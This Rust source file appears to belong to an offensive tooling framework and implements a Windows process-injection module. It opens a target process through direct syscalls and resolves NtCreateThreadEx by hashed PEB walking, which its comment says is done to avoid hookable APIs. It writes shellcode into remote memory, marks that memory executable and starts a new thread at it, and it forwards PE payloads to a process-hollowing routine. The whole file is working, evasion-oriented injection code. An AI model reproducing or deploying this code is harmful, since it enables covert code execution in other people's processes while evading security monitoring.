use crate::injection::{payload_has_valid_pe_headers, Injector};
use anyhow::{anyhow, Result};

pub struct NtCreateThreadInjector;

#[cfg(windows)]
impl Injector for NtCreateThreadInjector {
    /// Inject shellcode into a target process.
    ///
    /// The original implementation suspended an existing thread, redirected its
    /// RIP, and appended a `push <orig_rip> / ret` trampoline so execution would
    /// resume normally after the shellcode returned.  The trampoline assumption is
    /// fragile: shellcodes that loop forever or call `ExitThread` never reach the
    /// trampoline, leaving the hijacked thread in an undefined state and destabilising
    /// the target process (L-06 fix).
    ///
    /// Replacement: allocate a fresh thread via `NtCreateThreadEx` that starts
    /// directly at the shellcode.  The target process's other threads are never
    /// touched, eliminating the return assumption entirely.
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
        use winapi::um::winnt::{
            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_WRITE, SYNCHRONIZE,
        };
        // Minimal thread access for NtCreateThreadEx: SYNCHRONIZE only.
        // The handle is closed immediately after creation (fire-and-forget).
        const THREAD_ACCESS_MINIMAL: u32 = SYNCHRONIZE;

        let is_pe = payload_has_valid_pe_headers(payload);
        if is_pe {
            log::info!(
                "PE payload detected, forwarding to process hollowing's inject_into_process"
            );
            return match hollowing::windows_impl::inject_into_process(pid, payload) {
                Ok(_) => Ok(()),
                Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e)),
            };
        }

        // Open target process via NtOpenProcess
        let mut client_id = [0u64; 2];
        client_id[0] = pid as u64;
        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

        unsafe {
            let mut h_proc: usize = 0;
            let access_mask = (PROCESS_VM_OPERATION
                | PROCESS_VM_WRITE
                | PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION) as u64;
            let open_status = syscall!(
                "NtOpenProcess",
                &mut h_proc as *mut _ as u64,
                access_mask,
                &mut obj_attr as *mut _ as u64,
                client_id.as_mut_ptr() as u64,
            );
            match open_status {
                Ok(s) if s >= 0 && h_proc != 0 => {}
                _ => return Err(anyhow!("NtCreateThread: NtOpenProcess failed")),
            }
            let h_proc = h_proc as *mut std::ffi::c_void;

            macro_rules! close_h {
                ($h:expr) => {
                    syscall!("NtClose", $h as u64).ok();
                };
            }
            macro_rules! cleanup_and_err {
                ($msg:expr) => {{
                    close_h!(h_proc);
                    return Err(anyhow!($msg));
                }};
            }

            // Resolve NtCreateThreadEx via PEB walk to avoid hookable CreateRemoteThread.
            let ntdll_base =
                pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
                    .unwrap_or(0);
            if ntdll_base == 0 {
                cleanup_and_err!("NtCreateThreadInjector: ntdll not found in PEB");
            }
            let ntcreate_addr = pe_resolve::get_proc_address_by_hash(
                ntdll_base,
                pe_resolve::hash_str(b"NtCreateThreadEx\0"),
            );
            let ntcreate_addr = match ntcreate_addr {
                Some(a) => a,
                None => cleanup_and_err!("NtCreateThreadInjector: NtCreateThreadEx not found"),
            };
            type NtCreateThreadExFn = unsafe extern "system" fn(
                *mut *mut std::os::raw::c_void,
                u32,
                *mut std::os::raw::c_void,
                *mut std::os::raw::c_void,
                *mut std::os::raw::c_void,
                *mut std::os::raw::c_void,
                u32,
                usize,
                usize,
                usize,
                *mut std::os::raw::c_void,
            ) -> i32;
            let nt_create_thread: NtCreateThreadExFn = std::mem::transmute(ntcreate_addr);

            // Allocate RW memory, write shellcode, then flip to RX.
            let mut remote_mem: *mut std::ffi::c_void = std::ptr::null_mut();
            let mut alloc_size = payload.len();
            let s = syscall!(
                "NtAllocateVirtualMemory",
                h_proc as u64, &mut remote_mem as *mut _ as u64,
                0u64, &mut alloc_size as *mut _ as u64,
                (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
            );
            match s {
                Ok(st) if st >= 0 => {}
                _ => cleanup_and_err!("NtAllocateVirtualMemory failed"),
            }
            if remote_mem.is_null() {
                cleanup_and_err!("NtAllocateVirtualMemory returned null");
            }

            let mut written = 0usize;
            let s = syscall!(
                "NtWriteVirtualMemory",
                h_proc as u64, remote_mem as u64,
                payload.as_ptr() as u64, payload.len() as u64,
                &mut written as *mut _ as u64,
            );
            match s {
                Ok(st) if st >= 0 => {}
                _ => cleanup_and_err!("NtWriteVirtualMemory failed"),
            }
            if written != payload.len() {
                cleanup_and_err!(
                    "NtWriteVirtualMemory wrote {} of {} bytes",
                    written,
                    payload.len()
                );
            }

            let mut old_prot = 0u32;
            let mut prot_base = remote_mem as usize;
            let mut prot_size = payload.len();
            let s = syscall!(
                "NtProtectVirtualMemory",
                h_proc as u64, &mut prot_base as *mut _ as u64,
                &mut prot_size as *mut _ as u64,
                PAGE_EXECUTE_READ as u64, &mut old_prot as *mut _ as u64,
            );
            match s {
                Ok(st) if st >= 0 => {}
                _ => cleanup_and_err!("NtProtectVirtualMemory to RX failed"),
            }
            // Flush I-cache before creating the new thread.
            syscall!(
                "NtFlushInstructionCache",
                h_proc as u64, remote_mem as u64, payload.len() as u64,
            ).ok();

            let mut h_thread: *mut std::os::raw::c_void = std::ptr::null_mut();
            let status = nt_create_thread(
                &mut h_thread,
                THREAD_ACCESS_MINIMAL,
                std::ptr::null_mut(),
                h_proc,
                remote_mem,
                std::ptr::null_mut(),
                0,
                0,
                0,
                0,
                std::ptr::null_mut(),
            );
            if status < 0 || h_thread.is_null() {
                cleanup_and_err!("NtCreateThreadEx failed: {:x}", status);
            }

            close_h!(h_thread);
            close_h!(h_proc);
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for NtCreateThreadInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("NtCreateThread injection only supported on Windows"))
    }
}
